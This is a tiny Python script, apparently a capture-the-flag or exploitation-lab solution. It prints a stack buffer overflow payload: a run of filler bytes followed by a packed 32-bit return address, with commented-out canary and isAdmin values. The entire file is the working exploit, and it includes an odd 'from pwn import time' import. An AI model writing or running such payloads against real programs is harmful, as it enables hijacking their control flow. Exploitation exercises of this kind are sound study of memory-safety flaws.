#!/bin/env python3
import sys
from pwn import time

buffer = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
# canary = b"\xEF\xBE\xAD\xDE"
# isAdmin = b"1111"

final = b'\xf6\x91\x04\x08\n'
# print(buffer + final)
sys.stdout.buffer.write(buffer + final)

# time.sleep(1)